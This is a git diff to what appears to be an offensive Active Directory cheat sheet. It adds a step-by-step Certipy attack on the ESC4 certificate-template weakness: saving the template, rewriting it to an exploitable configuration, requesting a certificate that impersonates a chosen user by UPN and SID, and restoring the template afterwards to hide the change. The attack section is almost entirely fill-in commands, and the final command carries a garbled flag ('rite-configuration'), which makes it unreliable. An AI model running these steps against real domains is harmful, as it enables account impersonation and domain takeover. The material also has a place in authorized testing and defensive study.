@@ -918,9 +918,26 @@ u.objectid ENDS WITH "-548" RETURN q
 <details>
   <summary> ESC4 </summary> 
 
+  ### Backup the config
+  ```shell
+  certipy template -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -target <target_server> -template <vulnerable_template> -save-configuration backup.json
+  ```
+  
+  ### Edit the template to have ESC1 config
   ```shell
   certipy template -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -target <target_server> -template <vulnerable_template> -write-default-configuration
   ```
+  
+  ### Request cert
+  ```shell
+    certipy req -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -ca <Certificate_authorities> -target <target_server> -template <vulnerable_template> -upn AD_user@<domain> -sid <user_SID>
+  ```
+  
+  ### Restore the old config
+  ```shell
+  certipy template -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -target <target_server> -template <vulnerable_template> rite-configuration backup.json -no-save
+  ```
+
 </details> 
 
 <details>
